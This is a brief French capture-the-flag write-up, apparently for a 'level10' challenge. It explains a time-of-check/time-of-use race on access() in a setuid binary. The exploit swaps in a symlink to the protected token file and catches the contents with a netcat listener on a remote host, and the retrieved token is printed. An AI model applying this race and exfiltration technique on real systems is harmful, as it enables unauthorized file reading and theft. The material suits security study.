le binaire level10 ecrit le contenue d'un fichier a une adresse ip sur le port 6969
mais une verification du fichier est faite avant de l'ouvrir pour savoir si l'utilisateur reel a les droits dessus (ici non)
mais existe une fail de la fonction access entre le moment ou il check et ouvre le fichier nous pouvons creer un lien symbolique du fichier reel que nous voulons ouvrir

Sur le serveur tty1:
~>echo "123" > /tmp/link
~>./level10 /tmp/link 192.168.56.1
Connecting to 192.168.56.1:6969 ..
[wait]

Sur le serveur tty2:
~>ln -fs /home/user/level10/token /tmp/link

Sur notre machine local:
~>nc -lv 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
